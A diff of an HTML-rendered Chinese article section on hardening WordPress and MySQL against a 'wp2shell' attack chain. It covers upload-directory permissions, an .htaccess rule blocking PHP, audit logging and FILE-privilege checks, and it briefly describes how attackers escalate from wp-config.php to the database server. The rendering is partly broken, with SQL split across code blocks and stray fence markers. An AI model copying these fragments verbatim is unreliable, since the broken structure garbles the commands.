+<div class="highlight"><pre><span></span><code><span class="c1"># ① 把 wp-content/uploads/ 设为不可执行（即便 PHP 上传了文件也不能直接执行）</span>
+<span class="c1"># 在 NGINX 配置中已经实现，这里补充 PHP-FPM 层面的防护：</span>
+<span class="n">chown</span><span class="w"> </span><span class="o">-</span><span class="n">R</span><span class="w"> </span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span>
+<span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">type</span><span class="w"> </span><span class="n">d</span><span class="w"> </span><span class="o">-</span><span class="n">exec</span><span class="w"> </span><span class="n">chmod</span><span class="w"> </span><span class="mi">755</span><span class="w"> </span><span class="p">{}</span><span class="w"> </span>\<span class="p">;</span>
+<span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">type</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="o">-</span><span class="n">exec</span><span class="w"> </span><span class="n">chmod</span><span class="w"> </span><span class="mi">644</span><span class="w"> </span><span class="p">{}</span><span class="w"> </span>\<span class="p">;</span>
+
+<span class="c1"># ② 检查 wp-config.php 的权限（应该只有 root 能写）</span>
+<span class="n">chmod</span><span class="w"> </span><span class="mi">440</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">config</span><span class="o">.</span><span class="n">php</span>
+<span class="n">chown</span><span class="w"> </span><span class="n">root</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">config</span><span class="o">.</span><span class="n">php</span>
+
+<span class="c1"># ③ 禁用 PHP 在 uploads 目录的执行（多层防护）</span>
+<span class="c1"># a) NGINX 层（已配置）</span>
+<span class="c1"># b) Apache 层</span>
+<span class="n">echo</span><span class="w"> </span><span class="s1">&#39;&lt;FilesMatch &quot;.php$&quot;&gt;</span>
+</code></pre></div>
+
+<p>Require all denied
 </FilesMatch>' &gt; /var/www/html/wp-content/uploads/.htaccess</p>
-<h1 id="c-php-fpm-phpini">c) PHP-FPM 层（用 php.ini 路径限制）</h1>
-<h1 id="php-fpmconf-chroot-pool-php_admin_valueopen_basedir">在 php-fpm.conf 里设置 chroot 或在 pool 配置里加 php_admin_value[open_basedir]</h1>
+<div class="highlight"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="n">PHP</span><span class="o">-</span><span class="n">FPM</span><span class="w"> </span><span class="n">层</span><span class="err">（</span><span class="n">用</span><span class="w"> </span><span class="n">php</span><span class="p">.</span><span class="n">ini</span><span class="w"> </span><span class="n">路径限制</span><span class="err">）</span>
+<span class="err">#</span><span class="w"> </span><span class="n">在</span><span class="w"> </span><span class="n">php</span><span class="o">-</span><span class="n">fpm</span><span class="p">.</span><span class="n">conf</span><span class="w"> </span><span class="n">里设置</span><span class="w"> </span><span class="n">chroot</span><span class="w"> </span><span class="n">或在</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="n">配置里加</span><span class="w"> </span><span class="n">php_admin_value</span><span class="o">[</span><span class="n">open_basedir</span><span class="o">]</span>
+</code></pre></div>
+
 <p>4.3 数据库防护</p>
 <p>把数据库层防护单独列出来，是因为 wp2shell 攻击链的核心步骤依赖 SQL 注入。除了前面提到的撤销 FILE 权限，还有几条值得做的：</p>
 <p><strong>启用审计日志</strong></p>
-<h1 id="etcmysqlmysqlconfdauditcnf">/etc/mysql/mysql.conf.d/audit.cnf</h1>
+<div class="highlight"><pre><span></span><code># /etc/mysql/mysql.conf.d/audit.cnf
+</code></pre></div>
+
 <p>[mysqld]</p>
-<h1 id="mysql-enterprise-mariadb-plugin-load-add">启用审计插件（MySQL Enterprise）或用 MariaDB 的 plugin-load-add</h1>
+<div class="highlight"><pre><span></span><code><span class="c1"># 启用审计插件（MySQL Enterprise）或用 MariaDB 的 plugin-load-add</span>
+</code></pre></div>
+
 <p>plugin-load-add = server_audit
 server_audit_logging = ON
 server_audit_events = QUERY_DDL,QUERY_DML
@@ -799,14 +945,27 @@ server_audit_file_path = /var/log/mysql/audit.log</p>
 <p>或者用 Percona 的审计插件（开源版）。</p>
 <p><strong>定期审计 mysql user grants</strong></p>
 <p>把下面这条加入日常运维清单，每月跑一次：</p>
-<p>SELECT user, host, plugin, authentication_string,
-password_expired, password_last_changed, account_locked
-FROM mysql.user;</p>
-<p>SELECT GRANTEE, TABLE_SCHEMA, PRIVILEGE_TYPE
-FROM information_schema.SCHEMA_PRIVILEGES
-WHERE GRANTEE LIKE "'wordpress'%";——关键检查：FILE 权限不应出现在任何非管理员用户上
-SELECT * FROM information_schema.USER_PRIVILEGES
-WHERE PRIVILEGE_TYPE = 'FILE';</p>
+<div class="highlight"><pre><span></span><code><span class="w">    </span>SELECT<span class="w"> </span>user,<span class="w"> </span>host,<span class="w"> </span>plugin,<span class="w"> </span>authentication_string,
+</code></pre></div>
+
+<p>password_expired, password_last_changed, account_locked</p>
+<div class="highlight"><pre><span></span><code>FROM mysql.user;
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="w">    </span>SELECT<span class="w"> </span>GRANTEE,<span class="w"> </span>TABLE_SCHEMA,<span class="w"> </span>PRIVILEGE_TYPE
+<span class="w">    </span>FROM<span class="w"> </span>information_schema.SCHEMA_PRIVILEGES
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>WHERE GRANTEE LIKE &quot;&#39;wordpress&#39;%&quot;;
+
+```——关键检查：FILE 权限不应出现在任何非管理员用户上
+```bash
+    SELECT * FROM information_schema.USER_PRIVILEGES
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>WHERE PRIVILEGE_TYPE = &#39;FILE&#39;;
+</code></pre></div>
+
 <p><strong>风险提示</strong>：MySQL 8.0 默认的 <code>caching_sha2_password</code> 认证插件对老客户端不友好，但安全模型更强。如果你的 WordPress 是 5.5+ 版本（基本都满足），建议把 <code>wordpress</code> 用户的认证插件从 <code>mysql_native_password</code> 切到 <code>caching_sha2_password</code>。</p>
 <p>另外还有一个常被忽略的细节：<code>wp-config.php</code> 里的数据库密码应该用专用密码，不要复用 MySQL root 密码。我们在 wp2shell 应急响应中看到过几个案例，攻击者通过 wp2shell 读 wp-config.php 后获得 MySQL root 密码，进而直接控制整个数据库服务器。这是把 wp2shell 从\"WordPress 入侵\"升级为\"数据库服务器入侵\"的典型路径。一个具体的保护措施是把 MySQL 的 root 账户限制为本地 socket 认证（<code>unix_socket</code> plugin 或 <code>mysql_native_password</code> + <code>skip-networking</code>），这样即使 wp-config.php 泄露，外部也无法用 root 密码远程登录。</p>
 <p>4.4 攻防对抗的演化方向</p>
